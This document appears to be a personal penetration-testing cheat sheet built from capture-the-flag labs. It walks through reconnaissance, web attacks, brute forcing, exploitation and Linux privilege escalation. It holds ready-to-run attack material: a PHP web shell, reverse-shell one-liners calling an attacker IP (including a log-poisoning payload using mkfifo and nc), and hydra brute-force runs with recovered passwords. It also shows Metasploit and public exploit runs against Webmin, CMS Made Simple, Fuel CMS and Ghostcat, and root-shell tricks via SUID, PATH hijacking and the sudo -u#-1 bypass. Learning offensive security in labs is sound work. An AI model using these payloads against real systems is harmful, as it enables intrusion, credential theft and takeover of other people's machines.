# PATH - Procedural Approach To Hack

## OSINT

### Infrastructure

Passive information gathering: Search for any information (i.e., DB leak, credentials, valuable information) about the web site by OSINT tools. We collect publicly available information using search engines, whois, certificate information, etc. The goal is to obtain as much information as possible to use as inputs to the active information gathering phase.

Command line tools:

`whois website.com`

Use `nslookup` and `dig` tools for searching for any information by querying DNS server. For example for searching MX servers, run `nslookup -query=MX githubapp.com`.

Perform the Passive Subdomain Enumeration.

Perform Passive Infrastructure Identification by using Netcraft and Wayback Machine.

### Person

Look `OhSINT.md` file.

### Existing and non-existing website

`whois <domain.xxx>` allows to retrieve several information as:
* Registrar Name: name of the company the domain was registered with (i.e., NAMECHEAP INC)
* Registrar Abuse Contact Phone
* Name Servers
* Registrant Name (it could be be Redacted for Privacy)
* Registrant Country
* Much other information

Use Wayback Machine for searching old snapshots of the website and navigate them.

Use https://viewdns.info on IP History feature for checking which IP address the domain had in a specific past date.

A useful info could be infer which kind of hosting service the website is using (Shared Hosting, Cloud Hosting, VPS Hosting, Managed WordPress Hosting, Colocation Hosting).

In case we need to check how many IP addresses a NON-existing website changed, in IP History of https://viewdns.info, try to count from the beginning to the row containing the IP Address Owner equal to the Registrar Name you found by `whois`.

Often, clues about a website and its creator/owner may be unintentionally left behind in the source code of the website under the form of comments. Note: This also works on sites you visit within Archive.org's Wayback Machine. As easy as that may be to read, if it was buried inside a gigantic page full of code it could still be easy to miss. That's where ctrl-F comes in. Here are some good things to search for with ctrl-f:

| Search Term | Explanation | More Information |
|-------------|-------------|------------------|
| `<!--` | Comments | See above |
| `@` | Email addresses | [Pivoting from an Email address](https://nixintel.info/osint/12-osint-resources-for-e-mail-addresses/) |
| `ca-pub` | Google Publisher ID | [Google's Description](https://support.google.com/adsense/answer/105516?hl=en) |
| `ua-` | Google AdSense ID | [Bellingcat Tutorial](https://www.bellingcat.com/resources/how-tos/2015/07/23/unveiling-hidden-connections-with-google-analytics-ids/) |
| `.jpg` | Also try other image file extensions | Likely to reveal more directory structure |

Finding any of the above data gives you a potential pivot point.

As example for Google ADSense ID, if in the heat.net website we find `ua-251372-24` AdSense ID, visit https://www.nerdydata.com and search for this ID. After the search, on the right side you will see the number of websites using this AdSense ID.

You can also search for affiliate links (look https://ppcmode.com/resources/affiliate-links).

For example, if you are in an article page with several links as http://www.heat.net/36/need-to-hire-a-commercial-heating-contractor/ and inside the text there is an external link to http://www.purchase.org/. Since it is a direct connection from www.heat.net to www.purchase.org, it means it is not an affiliate link, so there is no obvious financial connection between the two. But in some cases there could be another kind of connection. Indeed, if we go to https://viewdns.info and check the IP History for heat.net and purchase.org, we note that the IP Address Owner is the same. In fact, it is highly probable that both of these sites are owned and operated by the same entity. Why creating a Private Blog Network (PBN)?

By setting up a separate website that is completely under your control and exists for the sole purpose of telling search engines that your main site should rank higher in searches than it rightfully deserves.

heat[.]net, in its current form is probably not designed for human eyes at all. It is designed primarily to trick the search engines into placing purchase[.]org higher in the search results than it would have otherwise.

Purchase[.]org appears to be a drop shipping e-commerce site, which probably earns its owner substantially more money than heat[.]net. It needs that sweet sweet SEO juice to push it up the search engine results pages (AKA SERPs) though.

Is all of this ethical? Good question. Google, for one, would clearly define this practice as black hat and is constantly trying to improve its algorithms to penalize sites that do this kind of thing. As of this writing, though, it is not illegal.

Another case study: https://nixintel.info/osint/website-osint-whats-the-link-between-antifa-com-and-russia/

## Active Information Gathering

Identify web server version, OS, web application by reading HTTP header by using `curl -I "http://${TARGET}"` or `whatweb`. Use `wafw00f` for detecting any WAF in place. Use `aquatone` for getting some information by subdomains passed as input.

Use `nmap` by also `-sC` option. From the output, look also for the value of `http-title` field that could give us the name of the used software. Then search it on Google, mostly if we are able to get the runing version.

Just be aware that, if we have an IP address and not an URL, this IP address is associated to a vHost (i.e., default vHost of inlanefreight.local), if I know that the vHost is app.inlanefreight.local, I should edit /etc/hosts by inserting `<IP address> app.inlanefreight.local` otherwise I cannot ping or use tools like curl or whatweb or access by browser to it (in case port 80 or 443 are open).

Perform an active subdomain enumeration by using Zone Transfer by nslookup or dig. If needed, use also Gobuster dns. Try also to identify the name of DNS zones.

Perform a vHost enumeration.

## Internal Infrastructure

Plug laptops or Raspberry Pis into available ethernet sockets and start to sniff the traffic on a network segment for checking services we may attack (easy if the traffic is HTTP, very hard if traffic is encrypted if we don't have the key). If the traffic is unencrypted, We can check for credentials or session identifiers.

## Exploit Discovery

Refer to https://www.rapid7.com/db/ and https://www.exploit-db.com for getting exploits if possible. 

## Web Application

In general, for each injection you perform, for all the following techniques, give a look always if the value that you inject is reflected in the response. Try also to encode (URL encoding or Base64 or other) your payload.

Try to test with no user account and then with an user account in order to access to further resources.

Note: in case you visit a website like `http://10.10.149.63:10000/` (a Webmin application) and you get the following string:
```
This web server is running in SSL mode. Try the URL https://ip-10-10-149-63.eu-west-1.compute.internal:10000/ instead.
```
just visit `https://10.10.149.63:10000/` instead of the long URL above, and you will get the right page.

### Directory/File Enumeration

By using fuzzers, catch all directories/files of the web application. Catch also any subdomains/vhosts.
By using passive scan tool (ZAP), catch for all directories/files referred in the page source recursively (crawling).

If the fuzzer finds a directory that has not been found during the passive scan or a subdomain/vhost, start the passive scan on the directory or subdomain/vhost found by the fuzzer.

Fuzz also for files with specific extensions.

Look also for subdomains of subdomains, i.e. dev.admin.inlanefreight.com.

Finding additional IP ranges owned by our target may lead to discovering other domains and subdomains and open up our possible attack surface even wider.

We want to learn as much about our target as possible. We need to know what technology stacks our target is using. Are their applications all ASP.NET? Do they use Django, PHP, Flask, etc.? What type(s) of APIs/web services are in use? Are they using Content Management Systems (CMS) such as WordPress, Joomla, Drupal, or DotNetNuke, which have their own types of vulnerabilities and misconfigurations that we may encounter? We also care about the web servers in use, such as IIS, Nginx, Apache, and the version numbers. If our target is running outdated frameworks or web servers, we want to dig deeper into the associated web applications. We are also interested in the types of back-end databases in use (MSSQL, MySQL, PostgreSQL, SQLite, Oracle, etc.) as this will give us an indication of the types of attacks we may be able to perform.

We want to enumerate virtual hosts (vhosts), which are similar to subdomains but indicate that an organization is hosting multiple applications on the same web server. Example of vHosts: app.inlanefreight.local, dev.inlanefreight.local.

This part is the active information gathering: Some of the techniques used in the active information gathering stage include port scanning, DNS enumeration, directory brute-forcing, virtual host enumeration, and web application crawling/spidering.

Note: if you are trying to access to a folder, for example `http://blog.inlanefreight.com/wp-includes` and the browser page keeps loading, insert a `/` at the end of the path like `http://blog.inlanefreight.com/wp-includes/`.

Note also that, if, for example, the folder `http://blog.inlanefreight.com/wp-content/plugins/` seems empty, it could hide files. In this case, you can try to fuzz for some plugins, as `http://blog.inlanefreight.com/wp-content/plugins/mail-masta`. It is related also to all folders (i.e., `/wp-content/themes/`).

The suggested wordlists to be used during the fuzzing activities are: `directory-list-2.3-small.txt` and `common.txt`.

### Parameter Enumeration

In case some files return page with size 0, they could hide some parameters. We can fuzz them like: `ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3002/wsdl?FUZZ' -fs 0 -mc 200` or similar commands. Note that, in the case specific for Web Service, WSDL files can be found in many forms, such as `/example.wsdl`, `?wsdl`, `/example.disco`, `?disco etc`.

Remember that the Web Services could be also exposed on other ports, not necessarily to standard HTTP ports.

### Web Services and API Attacks

Search for Web Services and APIs for analysing if there is some exposed value. Check for non-standard HTTP ports (i.e., 3000, 3001, 3002, 3003 or other) for checking if some HTTP service is exposed and used for Web Service and API. Use also fuzzing as described above. Check if for Web Services and APIs you get vulnerabilities as Information Disclosure, Arbitrary File Upload, File Inclusion, XSS, SSRF ReDoS, XXE. and so on. Remember that, in some cases, parameter values could have specific format/encoding, for example Base64 (i.e., `curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"`).

In case you see some API endpoint, you can try to fuzz for some hidden elements by: `ffuf -w "/opt/useful/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:<PORT>/api/FUZZ'`

### Front-end Analysis (Client side)

Target: search for any comments, hidden directories/path, valuable information

Vulnerabilities: Sensitive Data Exposure, HTML injection, XSS, CSRF (need to store a script in the server)

* Analyze page source
   * Look for any comments, hidden directories or any valuable information (username, password, and so on) by analyzing the source of the pages of the web application. Look for HTML code and JS code (also obfuscated code can contain some useful comments/redirection)
      * AJAX JS communicates to the back-end
* Manipulate HTML code in order to check if code injection is possible (so if the code is not sanitized).

Search for `login.js` file if exists and check for some explicit function() containing the login mechanism. For example, look for **Overpass** THM Room writeup.


### Back-end Analysis

Target: search for any comments, hidden directories/path, valuable information, any HTTP Methods as DELETE or PUT

Vulnerabilities: Broken Authentication/Access Control, Malicious File Upload, Command Injection, SQL Injection (SQLi), XXE Injection

Try to inject also some payload in the filename of a file you want to upload.

During a port scan, if you see any ports (also non-standard) that expose HTTP services and at our GET request they answer with a SOAP message, you can try to send a POST request and craft a SOAP request in the body and inject some command (like `ping`). This vulnerability vould come from  "Deserialization of Untrusted Data". Take as example the "Bug Bounty Hunting Process" HTB module -> "Example 3: Reporting RCE" section.

* Analyze page source
   * By using Burp/ZAP:
      * by the Repeater, try to check if the found .php files can return a response that is different from the one we get on the browser (because of redirection).
      * look for any value in cookie or other header variable (pay attention to the URL encoding).
   * Look for any input field and test for any vulnerabilities.

### HTTP Web Tampering

Search for any 401 Unauthorized page and try to access with different HTTP methods.

Try to use also Command injection in GET parameters. If you get "malicious request detected" or blocking or not effective request, try to change to POST (by setting headers and body params) or viceversa if your original page is a POST request.

Look for HEAD: even if it does not return a body response, an action or command can be still executed.

With Web Tampering you can overcome also "Access Denied" and similar security checks.

### Web Attacks

IDOR

SSFR: when you try to do port scanning by, for example, `http://10.129.202.133:3000/api/userinfo?id=http://127.0.0.1:3002`, if the page keeps loading, it could mean the local port is opened.

XXE: look for any page of web application containing XML data (you can use Burpsuite for checking the body of the requests).

Remember that, in some cases, when you want to attack by IDOR, XXE, XSS, SSRF, LFI and so on, parameter values we inject could not work because they could have specific format/encoding, for example Base64 (i.e., `curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"`).

We can try also to inject values to parameters for checking if there is a delay on the process of the request. If so, we can try to perform a DoS attack (i.e., ReDoS).

### File Inclusion
If you are able to read files in the back-end server, find for LFI, so remember to search also for ssh keys or enumerate user credentials and then use those to login to the back-end server through SSH or any other remote session (i.e., credentials in a file like `config.php`). You can also check for PHP configuration files (i.e., `/etc/php/X.Y/apache2/php.ini` for Apache or at `/etc/php/X.Y/fpm/php.ini` for Nginx, where `X.Y` is the installed PHP version. From here, we can see if there are some particular configuration enabled (as `allow_url_include` that enables to include external data, including PHP code). From this information, try to use data wrapper or input wrapper or expect wrapper (see File Inclusion module). Look also for zip and phar wrappers.

For File Inclusion, remember to use `..%2f` instead of `../` because sometimes could happen that `curl "http://<TARGET IP>:<PORT>/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"` works but `curl "http://<TARGET IP>:3000/api/download/../../../../etc/hosts"`does not work because the `../` could be deleted (you can see it clearly if you see the address bar of the browser instead of using cURL).

Search also for RFI.

Perform Log Poisoning (PHP Session Poisoning and Server Log Poisoning). In addition to **server logs**, search also for **Server webroot path** and **server configurations file**.

In general, we should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if the ssh or ftp services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the the mail services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.
In practice, any internal file of a backend server we can manipulate by requests, we can try to poisoning them, by adding PHP code, and call these log files in order to execute the PHP code (of course if the specified web page executes PHP code).

### Authentication

Identify the product/software/solution used (web and not), search on Google for default credentials.

Try to inject `X-Forwarded-For: 127.0.0.1` or some particular value inside the `User-Agent` filed inside the HTTP request to try to bypass the authentication system.

Bruteforce Usernames by:
* OSINT or Social Networks
* User Unknown Attack
* Username Existence Inference (also check if cookie values are different for valid usernames and wrong usernames)
* Timing Attack
* Enumerate through Password Reset
* Enumerate through Registration Form
* Predictable Usernames

Bruteforce Passwords by:
* Password Issues
* Policy Inference
Note: before start a bruteforce, check always password policy so you can reduce the size of your wordlists

Check for Predictable Reset Tokens by:
* Weak Token Generation
* Short Tokens
* Weak Cryptography
* Reset Token as Temp Password

Authentication Credentials Handling:
* Try to check the work of password reset (password sent to the email, link sent to set new password, security questions)

Username Injection:
* Try to login with a standard user and ask for a password reset. Take this POST request and try to insert some parameter also if it is not shown in the request, i.e. `userid` by inserting an admin account (i.e., `userid=htbadmin&oldpasswd=htbuser&newpasswd=test&confirm=test&submit=doreset`)

Bruteforce Cookies by:
* Cookie token tampering (look for weak encryption or encoded tokens (look also for magic bytes) and weak session tokens)
* Remember also to check the "Remember me" checkbox

Insecure Token Handling:
* Session Fixation
* Token in URL

### Session Security

Try to grab the session ID in several way by: session fixation, phishing methods. It can be grabbed also with no interaction with the user: by traffic sniffing (i.e., by using Wireshark) or searching session files inside the web server (i.e., for PHP look inside the `session.save_path` parameter in `PHP.ini` check the path where session files are stored). In cases where you have direct access to a database via, for example, SQL injection or identified credentials, you should always check for any stored user sessions (i.e., you can have a table called `all_sessions` or a similar name).

Detect Stored XSS for getting cookies (so, session IDs).

Try to make some CSRF. Check if Anti-CSRF token is shown in the request. If there is some Anti-CSRF token, we must find a way to steal it in order to use it during our requests (i.e., try to make a new user account and check for Anti-CSRF token while you do GET or POST requests). You can also try to compute the way the Anti-CSRF token is calculated (i.e., by md5(username)). Check for other CSRF Protection bypasses.
Try also to concatenate XSS and CSRF.

Try to check for any Open Redirect vulnerability.

### Inside Admin Panel of a web application

If you are able to enter in an Admin Panel of a web application and you can write PHP, Python or other code language, you can substitute an existing not critical file, i.e., `404.php`, and inject a reverse shell there, in order to call it from the external and access to the web server.

## Foothold

### Brute Force Services

#### FTP
```
hydra -l chris -P rockyou.txt 10.10.48.88 ftp

<SNIP>
[DATA] attacking ftp://10.10.48.88:21/
[21][ftp] host: 10.10.48.88   login: chris   password: crystal
[STATUS] 14344398.00 tries/min, 14344398 tries in 00:01h, 1 to do in 00:01h, 8 active
1 of 1 target successfully completed, 1 valid password found
<SNIP>
```
Note: if you need to get files from FTP, remember to switch FTP session to "binary" mode by executing `binary` otherwise the downloaded files will be corrupted.

#### SSH
```
hydra -l jan -P rockyou.txt 10.10.202.26 ssh

<SNIP>
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.202.26:22/
[STATUS] 146.00 tries/min, 146 tries in 00:01h, 14344255 to do in 1637:29h, 13 active
[STATUS] 106.67 tries/min, 320 tries in 00:03h, 14344081 to do in 2241:16h, 13 active
[STATUS] 95.14 tries/min, 666 tries in 00:07h, 14343735 to do in 2512:40h, 13 active
[22][ssh] host: 10.10.202.26   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-21 05:38:06
```

#### Web Application by Post Request
```
hydra -l admin -P $SECLISTS/Passwords/Leaked-Databases/rockyou.txt 10.10.13.25 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=invalid"

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://10.10.13.25:80/admin/:user=^USER^&pass=^PASS^:F=invalid
[80][http-post-form] host: 10.10.13.25   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
```

### Reverse Shell Transfer

If the target machine does not run bash, PHP, Python, netcat commands for running reverse shell, or there is not a SSH service for transfer files, set up a HTTP server on the attacker machine, then run `curl` or `wget` for transferring the reverse shell file to the target machine. Do it inside `/var/www/html` so you can call the reverse shell by the browser.

For getting semi-interactive shell, run:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
```
or
```
script /dev/null -c bash
export TERM=xterm-256color
```

### Services and Software

#### FTP

From Nmap result, if you run `-sC -sV`, give a look for a result like:
```
<SNIP>
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
<SNIP>
```
in particular `ftp [NSE: writeable]`. It means that the folder `ftp` is writeable, so, if you can access, also anonymously to FTP server, you can upload shells like:
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```
From this web shell, you can also run commands for running a reverse shell like:
```
php -r '$sock=fsockopen("10.18.98.39",4444);exec("/bin/sh <&3 >&3 2>&3");'
```
Remember to run netcat on the attacker machine.

#### SSH

In case you have a private key to connect by SSH, remember that you need also to specify both the key path and the username associated to the key, as:
```
ssh -i ssh.key 10.10.222.250 -l charlie
```

#### SMB

```
smbclient -L \\\\10.10.202.26\\ -N
Can't load /etc/samba/smb.conf - run testparm to debug it

Sharename       Type      Comment
---------       ----      -------
Anonymous       Disk      
IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
SMB1 disabled -- no workgroup available
```
Note, you can also use `//10.10.202.26/`.

IMPORTANT: some target servers could use very old version of SMB (i.e., SMBv1) and by default `smbclient` should work with SMBv2 as minimum protocol. If we try to connect to these old version target servers, we will get a `protocol negotiation failed: NT_STATUS_IO_TIMEOUT` error. For connecting correctly, we need to run the command in the following manner:
```
smbclient -N -L \\\\10.10.202.26\\ --option="client min protocol=CORE"
```

### POP3

After checked a working login with specific credentials by using Metasploit `auxiliary/scanner/pop3/pop3_login` module, you can enter in POP3 with these credentials by netcat:
```
nc $IPTARGET 110

+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
LIST
+OK 2 messages:
1 1622
2 1280
.
RETR 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
	id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone


.
RETR 2
+OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
	id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.

.
```

#### BORG
Let's take some information about Borg: https://medium.com/swlh/backing-up-with-borg-c6f13d74dd6

Borg is a backup software allowing to encrypt files we backup. What we can try to do and recover the backup:
```
cd home/field/dev/final_archive

borg list ./
Enter passphrase for key /home/athena/Downloads/archive/home/field/dev/final_archive: <squidward>
music_archive                        Tue, 2020-12-29 15:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]

borg extract ./::music_archive
```
At this point we get a `home` directory. Let's search some useful information.

#### GIT Repository

If a GIT repository is exposed on the website, we can dump it by:
```
git-dumper http://victim.htb/.git ~/website
```
Then, search for old commits:
```
cd ~/website
git log
```
and investigate all old commits in order to check if the old version of the repository has some sensitive information exposed.

### Password Cracking

Check always that the hashes to be cracked have the expected format described here: https://hashcat.net/wiki/doku.php?id=example_hashes because in some cases, `<ext>2john` can add additional strings that must be deleted (i.e., if you use `zip2john`).

Use John for cracking zip or SSH Private keys protected by passphrases.

If John seems to not find anything, delete `john.pot` file or use Hashcat.

#### SSH
```
python2 /usr/bin/ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --format=SSH --wordlist=rockyou.txt

<SNIP>
beeswax          (id_rsa)
<SNIP>
```

#### GPG

If we have a `.pgp` file and a `.asc` file, we can use John for brute forcing the GPG key password by leveraging on `.asc` private key file:

```
gpg2john filename.asc > gpg.hash
john gpg.hash --wordlist=./rockyou.txt

<SNIP>
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)
<SNIP>
```
Go back to the victim machine and decrypt `credential.pgp` file:
```
gpg --import filename.asc
gpg --decrypt credential.pgp
<alexandrou>

merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

#### ZIP
Retrieve the hash by:
```
zip2john backup.zip > zip.hash
```
Sometimes, `zip2john` can add the zip file and its content at the beginning and the end of the string. Delete them in order that Hashcat or John can recognize this hash.
```
hashcat -a 0 -m 17200 -O zip.hash $SECLISTS/Passwords/Leaked-Databases/rockyou.txt
```

#### SHA-512 Crypt

Let's guess we have to crack:
```
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```
Save `$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/` in a file like `hash.txt` and run:
```
hashcat -a 0 -m 1800 -O hash.txt $ROCKYOU
```

### Session Poisoning

#### access.log

Poison the `access.log` file with a reverse shell by:
```
curl $TARGETIP -A "<?php echo system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ATTACKERIP 1337 >/tmp/f') ?>"
```
This command will poison the User Agent. Run `nc -lvnp 1337`.

Then, you can leverage on LFI vulnerability for calling the reverse shell by visiting
```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././var/log/apache2/access.log
```

### Steganography

#### Steghide

Some interesting files could be hidden inside images or background in the target website.

Use `steghide` for detecting if a file embeds other hidden files. It could be password-protected:
```
steghide extract -sf cute-alien.jpg

Enter passphrase:<Area51>
wrote extracted data to "message.txt".
```
If you don't know the password, use `stegcracker`.

Note that if you use `binwalk`, sometimes you don't see the right hidden files, so use always for first `steghide`.

#### Strings

Inside suspicious files, run `strings filename.ext` for discovering some useful string hidden in the file.

### CVE Usage

#### CMS Made Simple 2.2.8
This version is vulnerable to SQL Injection: https://www.exploit-db.com/exploits/46635

Let's run the PoC exploit taken by the link (run it as Python2). For first let's install `pip` and `requests` and `termcolor` modules for Python2:
```
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
sudo python2 get-pip.py
pip2 install requests termcolor
```
Then, run the exploit:
```
python2 exploit.py -u http://<TARGET_IP>/simple --crack -w rockyou.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

#### Fuel CMS 1.4
This version is vulnerable to Remote Command Execution: https://nvd.nist.gov/vuln/detail/CVE-2018-16763

Let's use this exploit: https://github.com/noraj/fuelcms-rce

Let's download `exploit.rb` and run:
```
ruby exploit.rb http://10.10.40.228 '<command>'
```

#### Ghostcat

Let's retrieve an exploit and run it:
```
git clone https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat.git
cd Hacking-Vulnerability-CVE-2020-1938-Ghostcat/

python2 CVE-2020-1938.py 10.10.18.94 -p 8009 -f WEB-INF/web.xml
```
The output will contain at the end a string like:
```
  <description>
     Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlksalks
  </description>
```

#### Webmin <= 1.890 (cve-2019-15107)

Use Metasploit and search for "Webmin". One of the modules you can use is `exploit/linux/http/webmin_backdoor`:
```
msf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.10.149.63
RHOSTS => 10.10.149.63
msf6 exploit(linux/http/webmin_backdoor) > set LHOST 10.8.16.123
LHOST => 10.8.16.123
msf6 exploit(linux/http/webmin_backdoor) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 exploit(linux/http/webmin_backdoor) > run

[*] Started reverse TCP handler on 10.8.16.123:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.8.16.123:4444 -> 10.10.149.63:44512) at 2023-02-09 21:54:21 +0100

whoami
```

## Privilege Escalation

Check for first if the user can run commands as sudo.

Check for first also which group the user belongs by `id` command.

### Use LinPEAS

Download linpeas.sh script and, if you have SSH access to the target machine, upload it by SCP:
```
scp linpeas.sh username@<TARGET_IP>:/home/username/
```

### SUID permission

Run `find / -perm -u=s -type f 2>/dev/null`.

If you find `/usr/bin/python`, by looking at the https://gtfobins.github.io/gtfobins/python/ link, let's run:
```
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### PATH variable

If you have an executable file somewhere that has SETUID set, and, in case of ELF file you see by `strings` command that it has a code line that calls an executable in the system, for example:
```
tail -f /var/log/nginx/access.log
```
create an executable file with the same name of the called executable in `/tmp`, for example `/tmp/tail`, assign to it executable permissions by `chmod +x /tmp/tail` and write the following content to it:
```bash
/bin/sh
```
Then, run:
```
export PATH=/tmp:$PATH
```
and at the end, run the executable file with SETUID set. You will get the root shell.

### OS command replacement

In case a script or application containing an OS command (i.e., `cp`) has a SETUID enabled, we can create our own OS command file in order to run every command we wish. For example, if `backup.exe` has SETUID and by running `strings backup.exe` we see a command like:
```
cp /home/user/archangel/myfiles/* /opt/backupfiles
```
we can create our own `cp` command by creating a `cp` script in the current directory:
```
cat > cp << EOF
> #!/bin/bash
> /bin/bash -i
> EOF
```
then run:
```
chmod +x cp
export PATH=/home/archangel/secret:$PATH
```
Finally, run `./backup`.

### Use Reptile

https://github.com/f0rb1dd3n/Reptile

### Passwords in config files

Search inside the web application files if there are some config .php files (as `database.php` or `index.php`) in `/var/www/html/` path because some administrators could use the same root credentials of the database also for the system.

### Old SUDO version

If we visit https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version (CVE-2019-14287), we can run:
```
sudo -u#-1 /bin/bash
```
and we get root privileges.

If we are in a case where the standard user cannot run any commands as sudo like:
```
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```
`ALL` means we can run that specific command on behalf of any user, but since we have also `!root`, all users except users in the group `root`. But, if we have old `sudo` version, we can bypass it by running:
```
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```
Then we can call the shell inside VI.

In this way we bypassed the `!root` security check because Sudo doesn't check for the existence of the specified user id and executes it with arbitrary user id with the sudo priv, `-u#-1` returns as 0 which is root's id.

### Sudoers file
The syntax of the Sudoers file is: `(Runas-User:Group) <space> Commands`.
```
sudo -l
```
and check the name of the script at the last line. On the shown scripts, check always their permissions. Usually, even they are stored in root directories (as `/etc`), they (or files they call) could have write permission for every user. If these scripts are scheduled somewhere, we can edit them with our preferred commands, and then wait some minute for the result.

### VI

If `vi` or `vim` are shown for being run by sudo in the Sudoers file:
```
sudo /usr/bin/vim
```
On VIM environment, run:
```
:!cat /root/root.txt
```

In case the Sudoers file shows only one user we can run on behalf, for example:
```
User apaar may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```
with our current user, we can run:
```
sudo -u apaar /home/apaar/.helpline.sh
```

### Docker group

If the current user belongs to `docker` group, according to GTFOBins, we can escalate privileges. First, check if the user belongs to `docker` group:
```
id

uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```
